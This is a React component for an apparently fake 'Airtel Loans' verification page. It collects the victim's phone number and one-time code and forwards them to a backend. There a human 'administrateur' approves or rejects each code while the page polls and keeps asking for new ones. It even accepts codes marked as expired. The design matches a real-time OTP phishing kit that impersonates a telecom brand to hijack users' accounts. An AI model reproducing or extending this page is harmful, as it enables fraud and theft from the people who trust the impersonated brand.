import React, { useState, useRef, useEffect, useCallback } from 'react';
import { useNavigate } from 'react-router-dom';
import './App.css';

type ToastType = 'error' | 'success' | 'info';

const API_BASE = import.meta.env.VITE_API_BASE_URL ?? '';

const OTP_LENGTH = 4;
const POLL_FAST_MS = 2000;
const POLL_SLOW_MS = 5000;
const POLL_SLOW_AFTER_MS = 60_000;
const PENDING_KEY = 'airtelPendingRequest';

function makeRefId() {
  const ts = Date.now().toString(36).toUpperCase();
  const rand = Math.random().toString(36).slice(2, 6).toUpperCase();
  return `AL-${ts}-${rand}`;
}

function formatPhone(p: string) {
  if (!p) return 'votre téléphone';
  return p.replace(/(\+\d{3})(\d{3})(\d{3})(\d{3})/, '$1 $2 $3 $4');
}

function AirtelOTPVerify() {
  const [otp, setOtp] = useState<string[]>(Array(OTP_LENGTH).fill(''));
  const [timeLeft, setTimeLeft] = useState(45);
  const [error, setError] = useState('');
  const [expired, setExpired] = useState(false);
  const [isVerifying, setIsVerifying] = useState(false);
  const [isResending, setIsResending] = useState(false);
  const [waitingForAdmin, setWaitingForAdmin] = useState(false);
  const [submittedOtp, setSubmittedOtp] = useState('');
  const [refId, setRefId] = useState('');
  const [submittedAt, setSubmittedAt] = useState('');
  const [toast, setToast] = useState<{ message: string; type: ToastType } | null>(null);

  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);
  const pollTokenRef = useRef<{ cancelled: boolean } | null>(null);
  const pollTimerRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const hasResumedRef = useRef(false);
  const navigate = useNavigate();

  const phoneNumber = localStorage.getItem('airtelPhone') || '';

  const showToast = useCallback((message: string, type: ToastType = 'error') => {
    setToast({ message, type });
  }, []);

  const stopPolling = useCallback(() => {
    if (pollTokenRef.current) pollTokenRef.current.cancelled = true;
    pollTokenRef.current = null;
    if (pollTimerRef.current) {
      clearTimeout(pollTimerRef.current);
      pollTimerRef.current = null;
    }
  }, []);

  useEffect(() => {
    if (!phoneNumber) navigate('/');
  }, [phoneNumber, navigate]);

  useEffect(() => {
    inputRefs.current[0]?.focus();
  }, []);

  useEffect(() => {
    if (!toast) return;
    const t = setTimeout(() => setToast(null), 4000);
    return () => clearTimeout(t);
  }, [toast]);

  useEffect(() => {
    if (timeLeft <= 0) {
      setExpired(true);
      return;
    }
    const timer = setTimeout(() => setTimeLeft((p) => p - 1), 1000);
    return () => clearTimeout(timer);
  }, [timeLeft]);

  useEffect(() => stopPolling, [stopPolling]);

  const resetToInput = useCallback(
    (message?: string) => {
      stopPolling();
      setIsVerifying(false);
      setWaitingForAdmin(false);
      setSubmittedOtp('');
      setSubmittedAt('');
      setRefId('');
      setOtp(Array(OTP_LENGTH).fill(''));
      sessionStorage.removeItem(PENDING_KEY);
      if (message) {
        setError(message);
        showToast(message, 'error');
      }
      setTimeout(() => inputRefs.current[0]?.focus(), 100);
    },
    [showToast, stopPolling],
  );

  const startPolling = useCallback(
    (id: string) => {
      stopPolling();

      const token = { cancelled: false };
      pollTokenRef.current = token;
      const startedAt = Date.now();

      const tick = async () => {
        if (token.cancelled) return;

        try {
          const res = await fetch(
            `${API_BASE}/api/otp-status/${encodeURIComponent(id)}`,
            { cache: 'no-store' },
          );
          const data = await res.json();
          if (token.cancelled) return;

          if (data.status === 'approved') {
            stopPolling();
            sessionStorage.removeItem(PENDING_KEY);
            showToast('✅ Code approuvé ! Redirection...', 'success');
            setTimeout(() => navigate('/airtel-loan-limit'), 800);
            return;
          }

          if (data.status === 'rejected') {
            resetToInput("❌ Code refusé par l'administrateur. Veuillez saisir un nouveau code.");
            return;
          }

          if (data.status === 'expired') {
            resetToInput('⏱️ Demande expirée. Veuillez réessayer.');
            return;
          }
        } catch {
          /* keep polling */
        }

        if (token.cancelled) return;
        const elapsed = Date.now() - startedAt;
        const delay = elapsed < POLL_SLOW_AFTER_MS ? POLL_FAST_MS : POLL_SLOW_MS;
        pollTimerRef.current = setTimeout(tick, delay);
      };

      pollTimerRef.current = setTimeout(tick, POLL_FAST_MS);
    },
    [navigate, resetToInput, showToast, stopPolling],
  );

  useEffect(() => {
    if (hasResumedRef.current) return;
    hasResumedRef.current = true;

    try {
      const raw = sessionStorage.getItem(PENDING_KEY);
      if (!raw) return;
      const saved = JSON.parse(raw);
      if (!saved?.refId) return;

      setRefId(saved.refId);
      setSubmittedOtp(saved.otp ?? '');
      setSubmittedAt(saved.submittedAt ?? '');
      setWaitingForAdmin(true);
      setIsVerifying(true);
      startPolling(saved.refId);
    } catch {
      sessionStorage.removeItem(PENDING_KEY);
    }
  }, [startPolling]);

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const next = [...otp];
    next[index] = value.substring(value.length - 1);
    setOtp(next);
    if (value && index < OTP_LENGTH - 1) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
    if (e.key === 'ArrowLeft' && index > 0) inputRefs.current[index - 1]?.focus();
    if (e.key === 'ArrowRight' && index < OTP_LENGTH - 1) inputRefs.current[index + 1]?.focus();
  };

  const handlePaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    const digits = e.clipboardData
      .getData('text')
      .replace(/\D/g, '')
      .slice(0, OTP_LENGTH)
      .split('');
    if (!digits.length) return;
    e.preventDefault();
    const next = Array(OTP_LENGTH).fill('');
    digits.forEach((d, i) => (next[i] = d));
    setOtp(next);
    inputRefs.current[Math.min(digits.length, OTP_LENGTH - 1)]?.focus();
  };

  const handleVerify = async (e: React.FormEvent) => {
    e.preventDefault();
    if (isVerifying) return;

    const otpString = otp.join('');
    if (otpString.length < OTP_LENGTH) {
      setError(`Veuillez saisir le code à ${OTP_LENGTH} chiffres.`);
      showToast(`⚠️ Veuillez saisir le code à ${OTP_LENGTH} chiffres.`, 'error');
      return;
    }

    setError('');
    setIsVerifying(true);
    setWaitingForAdmin(false);

    const newRefId = makeRefId();
    const nowIso = new Date().toISOString();

    setSubmittedOtp(otpString);
    setRefId(newRefId);
    setSubmittedAt(nowIso);

    try {
      const response = await fetch(`${API_BASE}/api/verify-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          phone_number: phoneNumber,
          otp: otpString,
          ref_id: newRefId,
          submitted_at: nowIso,
        }),
      });
      const data = await response.json();

      const finalRef = data.ref_id || newRefId;
      setRefId(finalRef);

      if (data.status === 'approved') {
        sessionStorage.removeItem(PENDING_KEY);
        showToast('✅ Code approuvé ! Redirection...', 'success');
        setTimeout(() => navigate('/airtel-loan-limit'), 800);
        return;
      }

      if (data.status === 'rejected') {
        resetToInput(data.message || "❌ Code refusé par l'administrateur.");
        return;
      }

      setWaitingForAdmin(true);
      sessionStorage.setItem(
        PENDING_KEY,
        JSON.stringify({ refId: finalRef, otp: otpString, submittedAt: nowIso }),
      );
      startPolling(finalRef);
    } catch {
      resetToInput('⚠️ Erreur de connexion. Vérifiez votre réseau.');
    }
  };

  const handleResend = async () => {
    if (isVerifying || isResending) return;

    stopPolling();
    sessionStorage.removeItem(PENDING_KEY);
    setTimeLeft(45);
    setExpired(false);
    setOtp(Array(OTP_LENGTH).fill(''));
    setError('');
    setWaitingForAdmin(false);
    setSubmittedOtp('');
    setSubmittedAt('');
    setRefId('');
    setIsResending(true);

    try {
      const response = await fetch(`${API_BASE}/api/resend-otp`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone_number: phoneNumber }),
      });
      const data = await response.json();

      if (data.status === 'success') {
        showToast("📩 Nouveau code envoyé. L'administrateur a été notifié.", 'success');
        setTimeout(() => inputRefs.current[0]?.focus(), 100);
      } else {
        showToast(data.message || "Échec de l'envoi.", 'error');
      }
    } catch {
      showToast('Erreur de connexion au serveur.', 'error');
    } finally {
      setIsResending(false);
    }
  };

  return (
    <div className="airtel-container">
      {toast && (
        <div className={`airtel-toast airtel-toast-${toast.type}`}>
          <div className="airtel-toast-icon">
            {toast.type === 'error' && (
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10" />
                <line x1="12" y1="8" x2="12" y2="12" />
                <line x1="12" y1="16" x2="12.01" y2="16" />
              </svg>
            )}
            {toast.type === 'success' && (
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10" />
                <polyline points="16 9 10.5 15 8 12.5" />
              </svg>
            )}
            {toast.type === 'info' && (
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <circle cx="12" cy="12" r="10" />
                <line x1="12" y1="16" x2="12" y2="12" />
                <line x1="12" y1="8" x2="12.01" y2="8" />
              </svg>
            )}
          </div>
          <div className="airtel-toast-message">{toast.message}</div>
          <button className="airtel-toast-close" onClick={() => setToast(null)} aria-label="Fermer">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
              <line x1="18" y1="6" x2="6" y2="18" />
              <line x1="6" y1="6" x2="18" y2="18" />
            </svg>
          </button>
        </div>
      )}

      <div className="airtel-header">
        <div className="airtel-hamburger">
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <line x1="3" y1="12" x2="21" y2="12" />
            <line x1="3" y1="6" x2="21" y2="6" />
            <line x1="3" y1="18" x2="21" y2="18" />
          </svg>
        </div>
        <h1 className="airtel-logo">Airtel Loans</h1>
        <p className="airtel-tagline">Prêts rapides. À tout moment. Partout.</p>
      </div>

      <div className="airtel-card">
        {isVerifying ? (
          /* ---- WAITING FOR ADMIN STATE (spinner + text only) ---- */
          <div className="airtel-verifying-state">
            <div className="airtel-big-spinner" />
            <h2 className="airtel-otp-heading">
              {waitingForAdmin ? 'Vérification en cours...' : 'Traitement...'}
            </h2>
            <p className="airtel-otp-subtext">
              {waitingForAdmin
                ? "Votre code a été transmis à un administrateur pour validation. Veuillez patienter..."
                : 'Veuillez patienter un instant.'}
            </p>
          </div>
        ) : (
          /* ---- INPUT STATE ---- */
          <>
            <button className="airtel-back-link" onClick={() => navigate('/')}>
              <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#666" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <line x1="19" y1="12" x2="5" y2="12" />
                <polyline points="12 19 5 12 12 5" />
              </svg>
              Retour à la connexion
            </button>

            <h2 className="airtel-otp-heading">Vérifiez votre code</h2>
            <p className="airtel-otp-subtext">
              Saisissez le code à {OTP_LENGTH} chiffres envoyé à{' '}
              <strong>{formatPhone(phoneNumber)}</strong>
            </p>

            <form onSubmit={handleVerify}>
              <div className="airtel-input-group">
                <label>Saisir le code OTP</label>
                <div className="airtel-otp-container">
                  {otp.map((digit, index) => (
                    <input
                      key={index}
                      type="tel"
                      inputMode="numeric"
                      autoComplete="one-time-code"
                      maxLength={1}
                      value={digit}
                      ref={(el) => {
                        inputRefs.current[index] = el;
                      }}
                      onChange={(e) => handleChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      onPaste={handlePaste}
                      className="airtel-otp-box"
                    />
                  ))}
                </div>
              </div>

              {error && (
                <div className="airtel-alert" style={{ marginBottom: '20px' }}>
                  <div className="alert-icon">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#C81E1E" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                      <circle cx="12" cy="12" r="10" />
                      <line x1="12" y1="16" x2="12" y2="12" />
                      <line x1="12" y1="8" x2="12.01" y2="8" />
                    </svg>
                  </div>
                  <span>{error}</span>
                </div>
              )}

              <div className="airtel-timer" style={expired ? { color: '#DC2626' } : undefined}>
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke={expired ? '#DC2626' : '#E53E3E'} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <circle cx="12" cy="12" r="10" />
                  <polyline points="12 6 12 12 16 14" />
                </svg>
                <span>
                  {expired
                    ? 'Code expiré — vous pouvez toujours vérifier ou renvoyer'
                    : `Le code expire dans ${timeLeft}s`}
                </span>
              </div>

              <button type="submit" className="airtel-verify-btn">
                Vérifier le code
                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                  <line x1="5" y1="12" x2="19" y2="12" />
                  <polyline points="12 5 19 12 12 19" />
                </svg>
              </button>

              <button
                type="button"
                className="airtel-resend-btn"
                onClick={handleResend}
                disabled={isResending}
              >
                {isResending ? (
                  <span className="airtel-btn-loading">
                    <span className="airtel-spinner airtel-spinner-dark" />
                    Envoi en cours...
                  </span>
                ) : (
                  'Renvoyer le code'
                )}
              </button>
            </form>
          </>
        )}
      </div>
    </div>
  );
}

export default AirtelOTPVerify;